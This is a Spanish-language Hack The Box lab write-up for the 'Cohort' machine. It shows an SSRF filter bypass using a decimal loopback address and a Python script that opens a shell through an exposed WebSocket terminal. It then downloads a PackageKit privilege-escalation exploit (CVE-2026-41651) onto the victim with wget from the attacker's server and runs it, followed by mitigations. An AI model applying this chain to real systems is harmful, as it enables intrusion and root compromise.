# Cohort — HTB

**Plataforma:** Hack The Box  
**Dificultad:** Fácil  
**Categoría:** Web / SSRF / WebSocket / Linux / PackageKit

## 1. Reconocimiento

### Nmap

- Lanzamos un escaneo para identificar los puertos y servicios:

```bash
nmap -sCV -Pn 10.129.112.248
```

- Encontramos:

- `22/tcp` → SSH
- `80/tcp` → HTTP
- `443/tcp` → HTTPS

- Al acceder mediante HTTP, el servidor nos redirige al dominio:

```text
http://cohort.htb/
```

- Añadimos el dominio a nuestra resolución local:

```bash
sudo nano /etc/hosts
```

- Añadimos:

```text
10.129.112.248 cohort.htb
```

## 2. Enumeración

### Enumeración web

- Accedemos a:

```text
https://cohort.htb/
```

- Encontramos una ruta interesante:

```text
https://cohort.htb/portal.html
```

- Durante la revisión de la aplicación observamos que es posible acceder a información relacionada con el código fuente mediante una URL.

- Probamos una inyección JavaScript para comprobar si existe XSS:

```html
<script>alert('hola')</script>
```

- No conseguimos ejecutar el payload, por lo que descartamos XSS como vector inicial.

### Enumeración de la API

- Fuzzemos la API para buscar endpoints adicionales:

```bash
ffuf -u https://cohort.htb/<API>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

- No encontramos endpoints especialmente interesantes salvo:

```text
/health
```

### SSRF

- Probamos si la aplicación permite realizar peticiones hacia servicios locales.

- Las direcciones de loopback habituales son bloqueadas.

- Probamos una representación decimal de la dirección `127.0.0.1`:

```text
2130706433
```

- Utilizamos:

```text
http://2130706433/
```

- Esta representación funciona.

### ¿Por qué `2130706433` equivale a `127.0.0.1`?

- Una dirección IPv4 está formada por 32 bits.

- `127.0.0.1` puede representarse como un único número decimal:

```text
127 × 256³ + 0 × 256² + 0 × 256 + 1
```

- El resultado es:

```text
2130706433
```

- Esto nos permite saltarnos el filtro que bloqueaba directamente `127.0.0.1` o `localhost`.

### Acceso al endpoint `/status`

- Probamos:

```text
http://2130706433/status
```

- Obtenemos información del servicio interno, entre ella:

```json
"host":"nb-1be3782a8afd3ad5.cohort.htb"
```

- Hemos descubierto un host interno:

```text
nb-1be3782a8afd3ad5.cohort.htb
```

- Lo añadimos también a `/etc/hosts`:

```text
10.129.112.248 nb-1be3782a8afd3ad5.cohort.htb
```

- Accedemos mediante:

```text
https://nb-1be3782a8afd3ad5.cohort.htb
```

- Encontramos un panel de login de **Marimo**.

## 3. Explotación

### Acceso mediante WebSocket

- El panel utiliza un terminal mediante WebSocket.

- Observamos que el endpoint utilizado para el terminal es:

```text
wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
```

- Utilizamos el siguiente script para conectarnos directamente al WebSocket:

```python
import ssl
import threading
import websocket

url = "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws"

ws = websocket.create_connection(
    url,
    sslopt={"cert_reqs": ssl.CERT_NONE}
)

def receive():
    while True:
        try:
            data = ws.recv()
            if isinstance(data, bytes):
                data = data.decode(errors="replace")
            print(data, end="")
        except Exception:
            break

threading.Thread(target=receive, daemon=True).start()

for line in __import__("sys").stdin:
    ws.send(line.rstrip("\n") + "\n")
```

- El script establece una conexión con el WebSocket y nos permite enviar comandos al terminal remoto.

- Conseguimos acceso al sistema.

### Enumeración inicial

- Comprobamos nuestro usuario y grupos:

```bash
id
```

- También comprobamos si podemos utilizar `sudo`:

```bash
sudo -l
```

- `sudo` requiere contraseña y no podemos utilizarlo directamente.

- Buscamos binarios SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

- No encontramos ningún binario SUID interesante.

- Buscamos capabilities:

```bash
getcap -r / 2>/dev/null
```

- Tampoco encontramos un vector útil.

### Enumeración de paquetes

- Como las comprobaciones habituales no nos proporcionan una vía de escalada, revisamos los paquetes instalados:

```bash
dpkg -l
```

- Buscamos específicamente `packagekit`:

```bash
dpkg -l | grep packagekit
```

- Encontramos una versión de **PackageKit** susceptible a una vulnerabilidad de escalada de privilegios.

- Identificamos:

```text
CVE-2026-41651
```

## 4. Escalada de privilegios

### CVE-2026-41651

- Buscamos un exploit para la vulnerabilidad:

```bash
git clone https://github.com/Lutfifakee-Project/CVE-2026-41651.git
```

- Entramos en el directorio:

```bash
cd CVE-2026-41651
```

### Compilación del exploit

- Instalamos las dependencias necesarias para compilarlo:

```bash
sudo apt install libglib2.0-dev -y
```

- Compilamos el código:

```bash
gcc CVE-2026-41651.c -o exploit $(pkg-config --cflags --libs glib-2.0 gio-2.0)
```

- Esto genera:

```text
exploit
```

### Transferencia a la máquina víctima

- Levantamos un servidor HTTP en nuestra máquina en el directorio donde tenemos el exploit:

```bash
python3 -m http.server 8080
```

- Desde la máquina afectada descargamos el exploit:

```bash
wget http://10.10.14.11:8080/exploit -O /tmp/exploit
```

- Damos permisos de ejecución:

```bash
chmod +x /tmp/exploit
```

- Ejecutamos el exploit:

```bash
/tmp/exploit
```

- El exploit consigue realizar la escalada de privilegios.

- Comprobamos nuestro usuario:

```bash
whoami
```

- Obtenemos:

```text
root
```

- Ya tenemos privilegios máximos.

- Finalmente accedemos a la Root Flag.

## 5. Reporte

- La máquina **Cohort** expone los servicios SSH, HTTP y HTTPS.
- La aplicación web utiliza el dominio `cohort.htb`, que añadimos a `/etc/hosts`.
- Durante la enumeración descubrimos el portal web y comprobamos que no era posible explotar directamente el parámetro mediante XSS.
- Continuamos con la enumeración de la API y encontramos `/health`.
- Probamos peticiones hacia servicios locales y descubrimos que `2130706433`, representación decimal de `127.0.0.1`, permite saltarse el filtro de loopback.
- Mediante:

```text
http://2130706433/status
```

- Conseguimos descubrir un host interno:

```text
nb-1be3782a8afd3ad5.cohort.htb
```

- Accedemos al host y encontramos un panel de **Marimo** con un terminal WebSocket.
- Nos conectamos directamente al endpoint `/terminal/ws` mediante un script de Python y obtenemos acceso al sistema.
- Las comprobaciones de `sudo`, SUID y capabilities no proporcionan un vector útil de escalada.
- Continuamos con la enumeración de paquetes y encontramos `PackageKit`.
- Identificamos la vulnerabilidad **CVE-2026-41651**.
- Compilamos el exploit, lo transferimos a la máquina y lo ejecutamos.
- Conseguimos escalar privilegios hasta `root` y obtenemos la Root Flag.

### Cadena de ataque

```text
Nmap
 ↓
HTTP / HTTPS
 ↓
cohort.htb
 ↓
Enumeración web
 ↓
SSRF
 ↓
127.0.0.1 → 2130706433
 ↓
/status
 ↓
Host interno
 ↓
Marimo
 ↓
WebSocket /terminal/ws
 ↓
Acceso al sistema
 ↓
Enumeración
 ↓
PackageKit
 ↓
CVE-2026-41651
 ↓
Exploit
 ↓
root
 ↓
Root Flag
```

### Vulnerabilidades encontradas

| Vulnerabilidad | Severidad | Impacto |
|---|---|---|
| SSRF con bypass mediante representación decimal de IP | Alta | Permite acceder a servicios internos |
| Exposición de host interno mediante `/status` | Media | Revela infraestructura interna |
| Terminal WebSocket accesible | Crítica | Permite obtener acceso al sistema |
| PackageKit vulnerable a CVE-2026-41651 | Crítica | Permite escalada de privilegios a root |

### Mitigaciones

- Validar correctamente las direcciones IP y normalizarlas antes de aplicar filtros anti-SSRF.
- Bloquear todas las representaciones equivalentes de direcciones privadas y de loopback.
- No exponer información de infraestructura interna mediante endpoints públicos.
- Proteger correctamente los terminales WebSocket mediante autenticación y autorización.
- Mantener PackageKit actualizado a una versión corregida.
- Aplicar el principio de mínimo privilegio.

## 🧠 Lessons Learned

- Las aplicaciones SSRF no deben validar una IP únicamente mediante una comparación textual.
- Las direcciones IPv4 pueden representarse en diferentes formatos, por lo que `127.0.0.1` no siempre aparece literalmente.
- `2130706433` es una representación decimal de `127.0.0.1` y puede utilizarse para evadir filtros mal implementados.
- Un endpoint como `/status` puede revelar hosts y servicios internos importantes.
- Los WebSocket también deben considerarse durante la enumeración de aplicaciones web.
- Si `sudo`, SUID y capabilities no proporcionan un vector, hay que seguir revisando paquetes y servicios instalados.
- `dpkg -l` permite enumerar los paquetes instalados en sistemas Debian/Ubuntu.
- Las vulnerabilidades de componentes del sistema como PackageKit pueden proporcionar una vía de escalada de privilegios incluso cuando no existen SUID o reglas de `sudo` útiles.
